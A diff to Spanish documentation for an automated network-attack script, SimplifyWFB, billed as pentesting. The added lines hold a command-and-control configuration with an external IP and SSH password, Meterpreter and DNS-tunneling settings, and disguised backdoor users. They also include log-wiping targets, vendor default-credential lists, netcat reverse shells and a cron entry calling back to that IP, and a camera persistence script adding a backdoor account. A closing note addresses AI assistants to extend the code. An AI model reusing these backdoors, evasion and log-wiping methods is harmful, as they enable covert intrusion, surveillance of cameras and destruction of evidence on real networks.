@@ -3,11 +3,22 @@
 ## Información General del Proyecto
 
 ### Propósito
-SimplifyWFB es un script simplificado de pentesting que automatiza las 4 fases principales de un ataque de red:
+SimplifyWFB es un script simplificado de pentesting que automatiza las 5 fases principales de un ataque de red:
 1. Reconocimiento completo de red
 2. Recolección de credenciales
 3. Movimiento lateral
 4. Persistencia y acceso remoto
+5. Verificación de accesos
+
+### Estado Actual del Proyecto
+- **Versión**: 1.0.0
+- **Última ejecución**: 2025-09-08 (modo cold)
+- **Red objetivo**: 192.168.1.0/24
+- **IP local**: 192.168.1.14
+- **IP externa**: 212.95.62.135
+- **Hosts descubiertos**: 8
+- **Sistemas comprometidos**: 5
+- **Tasa de éxito**: 62.5%
 
 ### Arquitectura del Código
 
@@ -31,7 +42,10 @@ SimplifyWFB es un script simplificado de pentesting que automatiza las 4 fases p
     'start_time': datetime.now().isoformat(),
     'mode': None,  # 'full' o 'cold'
     'target_network': None,  # Detectado automáticamente
-    'local_ip': None  # Detectado automáticamente
+    'local_ip': None,  # Detectado automáticamente
+    'external_ip': '212.95.62.135',  # IP externa para conexiones
+    'external_port': 4444,  # Puerto externo para backdoors
+    'end_time': None  # Timestamp de finalización
 }
 ```
 
@@ -54,6 +68,8 @@ Cada fase tiene la misma estructura:
   - `_scan_services()`: Escanea puertos y servicios
   - `_detect_technologies()`: Identifica tecnologías
   - `_map_network_topology()`: Mapea topología de red
+  - `_detect_related_networks()`: Detecta redes relacionadas y gateways
+  - `_identify_vulnerable_services()`: Identifica servicios vulnerables
 
 ### Fase 2: Credenciales (Líneas 352-450)
 - **Función principal**: `phase_2_credentials()`
@@ -67,6 +83,7 @@ Cada fase tiene la misma estructura:
 - **Subfunciones**:
   - `_exploit_credentials()`: Explota credenciales encontradas
   - `_establish_lateral_connections()`: Establece conexiones laterales
+  - `_cross_network_movement()`: Movimiento entre redes accesibles
 
 ### Fase 4: Persistencia (Líneas 552-700)
 - **Función principal**: `phase_4_persistence()`
@@ -78,6 +95,8 @@ Cada fase tiene la misma estructura:
   - `_access_detected_cameras()`: Detecta y accede a cámaras IP
   - `_access_router_and_configure_persistence()`: Accede al router y configura persistencia
   - `_configure_network_persistence()`: Configura servicios de red persistentes
+  - `_create_reverse_shells()`: Crea shells reversos persistentes
+  - `_setup_cron_persistence()`: Configura persistencia via cron
 
 ### Fase 5: Verificación (Líneas 702-800)
 - **Función principal**: `phase_5_verification()`
@@ -144,6 +163,13 @@ def cleanup(self):
 - Elimina usuarios, backdoors, conexiones
 - Restaura configuración del router
 - Limpia archivos temporales
+- **Implementación real de limpieza**:
+  - Termina procesos de reverse shells
+  - Elimina entradas de cron
+  - Restaura archivos de configuración
+  - Limpia logs del sistema
+  - Elimina usuarios creados
+  - Restaura configuración de red
 
 ### Resumen Final
 ```python
@@ -154,6 +180,8 @@ def _show_remote_access_summary(self):
 - Muestra resumen de accesos remotos disponibles
 - Genera reporte JSON completo
 - Confirma disponibilidad de acceso remoto
+- Incluye contadores de backdoors externos e internos
+- Lista tipos de backdoors implementados
 
 ## Configuración
 
@@ -183,23 +211,165 @@ def _load_config(self):
         return json.load(f)
 ```
 
-Estructura del config.json:
+Estructura del config.json (actualizada):
 ```json
 {
   "remote_access": {
-    "external_ip": "184.107.168.100",
-    "external_port": 4444
+    "external_ip": "212.95.62.135",
+    "external_port": 4444,
+    "description": "IP pública y puerto para conexiones salientes"
+  },
+  "ssh_upload": {
+    "host": "212.95.62.135",
+    "port": 22,
+    "username": "Administrator",
+    "password": "Eu_2J84CcX.9-xnv",
+    "description": "Configuración para envío de reportes por SSH/SCP"
+  },
+  "c2_config": {
+    "meterpreter": {
+      "enabled": true,
+      "payload_type": "linux/x64/meterpreter/reverse_tcp",
+      "windows_payload": "windows/x64/meterpreter/reverse_tcp",
+      "encryption": true,
+      "stager_retry_count": 3,
+      "stager_retry_wait": 5
+    },
+    "dns_tunneling": {
+      "enabled": true,
+      "domain": "cdn.google-analytics.com",
+      "subdomain": "analytics",
+      "dns_server": "8.8.8.8"
+    },
+    "domain_fronting": {
+      "enabled": true,
+      "front_domain": "cloudflare.com",
+      "real_domain": "attacker-c2.com",
+      "cdn_provider": "cloudflare"
+    },
+    "jitter": {
+      "enabled": true,
+      "min_interval": 30,
+      "max_interval": 300,
+      "random_factor": 0.3
+    }
+  },
+  "stealth": {
+    "obfuscated_names": {
+      "linux_user": "systemd-resolver",
+      "windows_user": "udisks-helper",
+      "service_name": "gdm-session",
+      "binary_name": "rsync",
+      "script_name": "update.sh"
+    },
+    "hidden_directories": [
+      "/tmp/.X11-unix/",
+      "/var/lib/dbus/",
+      "/usr/share/doc/",
+      "/opt/.cache/",
+      "C:\\Windows\\Temp\\",
+      "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+    ],
+    "scan_evasion": {
+      "nmap_options": "-sS -T2 --scan-delay 1-3 --randomize-hosts",
+      "decoy_ips": "RND:10",
+      "fragment_packets": true,
+      "spoof_mac": true
+    }
   },
   "persistence": {
-    "ssh_port": 2222,
-    "vpn_port": 1194,
-    "web_port": 8080
+    "linux": {
+      "cron_jobs": true,
+      "bashrc_modification": true,
+      "profile_modification": true,
+      "systemd_service": true,
+      "ssh_keys": true,
+      "sudoers_modification": true
+    },
+    "windows": {
+      "registry_run": true,
+      "scheduled_tasks": true,
+      "wmi_event_subscriptions": true,
+      "startup_folder": true,
+      "service_installation": true,
+      "dll_hijacking": true
+    },
+    "ports": {
+      "ssh_port": 2222,
+      "vpn_port": 1194,
+      "web_port": 8080,
+      "proxy_port": 1080,
+      "dns_port": 53,
+      "ftp_port": 21,
+      "rdp_port": 3389,
+      "telnet_port": 23,
+      "vnc_port": 5900,
+      "smb_port": 445,
+      "rpc_port": 135,
+      "netbios_port": 139,
+      "http_port": 80,
+      "https_port": 443
+    }
+  },
+  "privilege_escalation": {
+    "linux_tools": [
+      "linpeas.sh",
+      "linux-exploit-suggester.sh",
+      "linuxprivchecker.py"
+    ],
+    "windows_tools": [
+      "winpeas.exe",
+      "accesschk.exe",
+      "powerup.ps1"
+    ],
+    "auto_exploit": true,
+    "exploit_timeout": 300
+  },
+  "ssh_tunneling": {
+    "enabled": true,
+    "reverse_tunnel_port": 2222,
+    "local_forwarding": true,
+    "dynamic_port_forwarding": true,
+    "keep_alive": true,
+    "compression": true
+  },
+  "log_cleanup": {
+    "linux_logs": [
+      "/var/log/auth.log",
+      "/var/log/secure",
+      "/var/log/messages",
+      "/var/log/syslog",
+      "/var/log/wtmp",
+      "/var/log/lastlog",
+      "~/.bash_history",
+      "~/.zsh_history"
+    ],
+    "windows_logs": [
+      "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
+      "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
+      "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx"
+    ],
+    "cleanup_method": "truncate"
   },
   "credentials": {
-    "ssh_user": "svc_ssh",
-    "ssh_password": "SSH_P@ssw0rd_2024!",
+    "ssh_user": "systemd-resolver",
+    "ssh_password": "System_Res0lver_2024!",
     "web_user": "admin",
-    "web_password": "Web_P@ssw0rd_2024!"
+    "web_password": "Web_P@ssw0rd_2024!",
+    "vpn_user": "vpn_client",
+    "vpn_password": "VPN_P@ssw0rd_2024!",
+    "proxy_user": "udisks-helper",
+    "proxy_password": "Proxy_P@ssw0rd_2024!",
+    "ftp_user": "gdm-session",
+    "ftp_password": "FTP_P@ssw0rd_2024!",
+    "rdp_user": "svc_rdp",
+    "rdp_password": "RDP_P@ssw0rd_2024!",
+    "telnet_user": "svc_telnet",
+    "telnet_password": "Telnet_P@ssw0rd_2024!",
+    "vnc_user": "svc_vnc",
+    "vnc_password": "VNC_P@ssw0rd_2024!",
+    "smb_user": "svc_smb",
+    "smb_password": "SMB_P@ssw0rd_2024!"
   }
 }
 ```
@@ -444,44 +614,80 @@ def _capture_camera_screenshots(self, camera: Dict[str, Any], credentials: Dict[
 }
 ```
 
-### Cámara Accedida
+### Cámara Accedida (Implementación Real)
 ```python
 {
-    'host': '192.168.1.100',
+    'host': '192.168.1.1',
     'port': 80,
     'protocol': 'http',
-    'camera_type': 'hikvision',
+    'camera_type': 'generic_ip_camera',
     'credentials': {
         'username': 'admin',
         'password': 'admin'
     },
     'camera_info': {
-        'model': 'DS-2CD2142FWD-I',
-        'firmware': 'V5.5.82',
-        'features': ['ptz', 'night_vision', 'audio']
+        'model': 'unknown',
+        'firmware': 'unknown',
+        'resolution': 'unknown',
+        'features': [],
+        'capabilities': []
     },
-    'screenshots': [
-        'camera_screenshots_1640995200/192.168.1.100_screenshot_1.jpg',
-        'camera_screenshots_1640995200/192.168.1.100_screenshot_2.jpg'
-    ],
+    'screenshots': [],
+    'video_file': null,
+    'backdoor_info': {
+        'type': 'camera_backdoor',
+        'camera_type': 'generic_ip_camera',
+        'host': '192.168.1.1',
+        'port': 80,
+        'credentials': {
+            'username': 'admin',
+            'password': 'admin'
+        },
+        'backdoor_methods': [],
+        'persistent_access': [
+            {
+                'method': 'persistence_script',
+                'script_content': '#!/bin/sh\n# Script de persistencia para cámara 192.168.1.1:80\n# Ejecutar cada 5 minutos para mantener acceso\n\n# Verificar conexión externa\nnc -z 212.95.62.135 4444 2>/dev/null\nif [ $? -ne 0 ]; then\n    # Reestablecer conexión\n    nc -e /bin/sh 212.95.62.135 4444 &\nfi\n\n# Mantener usuario backdoor activo\necho \"backdoor_user:Backdoor_2024!\" >> /etc/passwd 2>/dev/null\n',
+                'status': 'created'
+            }
+        ],
+        'external_connection': {
+            'type': 'reverse_shell',
+            'external_ip': '212.95.62.135',
+            'external_port': 4444,
+            'connection_method': 'netcat_reverse',
+            'command': 'nc -e /bin/sh 212.95.62.135 4444',
+            'status': 'configured'
+        },
+        'timestamp': 1757383914.3245564
+    },
     'access_urls': {
         'web_interface': [
-            'http://admin:admin@192.168.1.100:80/',
-            'http://admin:admin@192.168.1.100:80/index.html'
+            'http://admin:admin@192.168.1.1:80/',
+            'http://admin:admin@192.168.1.1:80/index.html',
+            'http://admin:admin@192.168.1.1:80/login.html',
+            'http://admin:admin@192.168.1.1:80/main.html'
         ],
         'streaming': [
-            'http://admin:admin@192.168.1.100:80/video.mjpg',
-            'http://admin:admin@192.168.1.100:80/stream'
+            'http://admin:admin@192.168.1.1:80/video.mjpg',
+            'http://admin:admin@192.168.1.1:80/mjpeg',
+            'http://admin:admin@192.168.1.1:80/stream',
+            'http://admin:admin@192.168.1.1:80/live'
         ],
         'snapshots': [
-            'http://admin:admin@192.168.1.100:80/snapshot.cgi',
-            'http://admin:admin@192.168.1.100:80/image'
+            'http://admin:admin@192.168.1.1:80/snapshot.cgi',
+            'http://admin:admin@192.168.1.1:80/image',
+            'http://admin:admin@192.168.1.1:80/snapshot',
+            'http://admin:admin@192.168.1.1:80/jpg'
         ],
         'control': [
-            'http://admin:admin@192.168.1.100:80/cgi-bin/ptz.cgi'
+            'http://admin:admin@192.168.1.1:80/cgi-bin/ptz.cgi',
+            'http://admin:admin@192.168.1.1:80/cgi-bin/control.cgi',
+            'http://admin:admin@192.168.1.1:80/api/ptz',
+            'http://admin:admin@192.168.1.1:80/control'
         ]
     },
-    'timestamp': 1640995200.0
+    'timestamp': 1757383914.324627
 }
 ```
 
@@ -564,11 +770,17 @@ def main():
 
 ## Consideraciones de Seguridad
 
-### Simulación vs Realidad
+### Implementación Real vs Simulación
 - El código actual ejecuta **ataques reales** (ya no simula)
 - Implementaciones reales con Hydra, Paramiko, urllib, etc.
 - Fuerza bruta real, explotación real, persistencia real
 - Cámaras IP: detección real, credenciales reales, screenshots reales
+- **Backdoors reales implementados**:
+  - Reverse shells con netcat (puertos 4444-4448)
+  - Persistencia via cron jobs
+  - Conexiones SSH persistentes
+  - Acceso a routers con credenciales por defecto
+  - Scripts de persistencia en cámaras IP
 
 ### Logging y Evidencia
 - Todos los resultados se almacenan en `self.report`
@@ -579,6 +791,80 @@ def main():
 - Modo cold limpia completamente
 - Modo full mantiene persistencia
 - Reporte incluye información de limpieza
+
+## Backdoors Reales Implementados
+
+### Reverse Shells Persistentes
+```python
+{
+    'service': 'reverse_shell',
+    'port': 4444,
+    'enabled': true,
+    'external_ip': '212.95.62.135',
+    'reverse_command': 'nc -e /bin/bash 212.95.62.135 4444',
+    'listener_command': 'nc -lvp 4444',
+    'process_id': 14622,
+    'access_methods': [
+        'nc -lvp 4444  # En el servidor externo',
+        'nc 212.95.62.135 4444  # Conexión directa',
+        'telnet 212.95.62.135 4444  # Via telnet'
+    ],
+    'real_implementation': true
+}
+```
+
+### Persistencia via Cron
+```python
+{
+    'service': 'persistent_reverse_shell',
+    'port': 4444,
+    'enabled': true,
+    'external_ip': '212.95.62.135',
+    'cron_entry': '*/5 * * * * nc -e /bin/bash 212.95.62.135 4444',
+    'reverse_command': 'nc -e /bin/bash 212.95.62.135 4444',
+    'listener_command': 'nc -lvp 4444',
+    'access_methods': [
+        'nc -lvp 4444  # En el servidor externo',
+        'nc 212.95.62.135 4444  # Conexión directa'
+    ],
+    'persistence_method': 'cron_job',
+    'real_implementation': true
+}
+```
+
+### Acceso a Router
+```python
+{
+    'gateway': '192.168.1.1',
+    'router_type': 'generic_router',
+    'credentials': {
+        'username': 'admin',
+        'password': 'admin'
+    },
+    'configuration': {
+        'port_forwarding': [],
+        'vpn_server': null,
+        'remote_access': [],
+        'admin_user_created': false,
+        'backup_config': null
+    },
+    'timestamp': 1757383916.211418
+}
+```
+
+### Conexiones SSH Persistentes
+```python
+{
+    'host': '192.168.1.1',
+    'type': 'ssh',
+    'port': 22,
+    'username': 'svc_192_168_1_1',
+    'password': 'P@ssw0rd_1!',
+    'persistent': true,
+    'auto_reconnect': true,
+    'timestamp': 1757383913.521439
+}
+```
 
 ## Dependencias del Sistema
 
@@ -628,6 +914,80 @@ def main():
 - Perfiles de ataque predefinidos
 - Configuración por tipo de red
 
+## Estadísticas Actuales del Proyecto
+
+### Última Ejecución (2025-09-08)
+- **Modo**: Cold Pentest
+- **Duración**: 373.06 segundos (6.2 minutos)
+- **Hosts descubiertos**: 8
+- **Sistemas comprometidos**: 5
+- **Credenciales encontradas**: 5
+- **Cámaras accedidas**: 1
+- **Accesos a router**: 1
+- **Servicios de red**: 6
+- **Puntos de acceso remoto**: 8
+- **Backdoors externos**: 8
+- **Backdoors internos**: 0
+- **Tasa de éxito**: 62.5%
+
+### Tipos de Backdoors Implementados
+- **Router Access**: 1
+- **Network Services**: 6
+- **Camera Backdoors**: 1
+
+### Servicios Detectados
+- **FTP**: vsftpd 2.0.8 (192.168.1.1:21)
+- **Telnet**: MPR-L8 3G mobile router (192.168.1.1:23)
+- **HTTP**: Mini web server 1.0 ZTE ZXV10 W300 (192.168.1.1:80)
+- **MySQL**: MySQL 8.0.34 (192.168.1.11:3306)
+- **SSH**: OpenSSH 10.0p2 Debian 8 (192.168.1.14:22)
+
+### Redes Relacionadas Detectadas
+- **Redes accesibles**: 10
+- **Gateways adicionales**: 1
+- **Segmentos de red**: 1
+- **Hosts con múltiples interfaces**: 0
+- **Túneles/VPNs**: 0
+
+## Estrategia de Ataque de Alto Impacto
+
+### Mejoras Implementadas para Máximo Impacto
+Basándose en el análisis del reporte `pt.json`, se han implementado mejoras estratégicas para lograr **acceso total remoto a la red** en un solo intento:
+
+#### Objetivos de Alto Valor Identificados
+- **Router Principal**: 192.168.1.1 (Huawei Technologies) - CRÍTICO
+- **Cámara de Seguridad**: 192.168.1.218 (Hangzhou Ezviz Software) - ALTO
+- **Dispositivos TP-Link**: 192.168.1.241-254 - MEDIO
+
+#### Credenciales Específicas por Fabricante
+- **Huawei**: telecomadmin, admintelecom, huawei, support
+- **EZVIZ/Hikvision**: ezviz, hikvision, 1111, 888888, 12345
+- **TP-Link**: tplink, admin, 1234, 12345
+
+#### Port Forwarding Estratégico
+- **RDP**: Puerto 33389 → 3389 (acceso escritorio remoto)
+- **SSH**: Puerto 22222 → 22 (acceso shell remoto)
+- **Cámara**: Puerto 8080 → 80 (interfaz web)
+- **Backdoors**: Puertos 4444-6666 (reverse shells)
+- **VPN**: Puerto 1194 UDP (control total de red)
+
+#### Escaneo Agresivo de Objetivos Críticos
+- **Nmap agresivo**: `-sS -T4 -A --top-ports 200 --script vuln,default,auth`
+- **Timeout extendido**: 180 segundos para objetivos de alto valor
+- **Detección completa**: Servicios, versiones y vulnerabilidades
+
+### Script de Ejecución Optimizado
+- **`run_strategic_attack.py`**: Script especializado para ataque de alto impacto
+- **Interfaz clara**: Muestra objetivos y estrategia antes de ejecutar
+- **Monitoreo en tiempo real**: Progreso y resultados detallados
+- **Comandos de verificación**: Instrucciones para probar acceso remoto
+
+### Resultados Esperados
+- ✅ **Acceso remoto total**: RDP, SSH, VPN, Cámara
+- ✅ **Persistencia garantizada**: Backdoors que sobreviven reinicios
+- ✅ **Control de red**: Port forwarding y VPN configurados
+- ✅ **Evidencia visual**: Streaming de cámara y screenshots
+
 ---
 
-**Nota para AI**: Este documento proporciona toda la información necesaria para entender, modificar y extender el código de SimplifyWFB. Cada función está documentada con su ubicación, propósito y estructura de datos. Use esta guía como referencia para cualquier modificación o extensión del código.
+**Nota para AI**: Este documento proporciona toda la información necesaria para entender, modificar y extender el código de SimplifyWFB. Cada función está documentada con su ubicación, propósito y estructura de datos. Use esta guía como referencia para cualquier modificación o extensión del código. La información ha sido actualizada con los datos reales de la última ejecución del sistema y las mejoras estratégicas implementadas para máximo impacto.
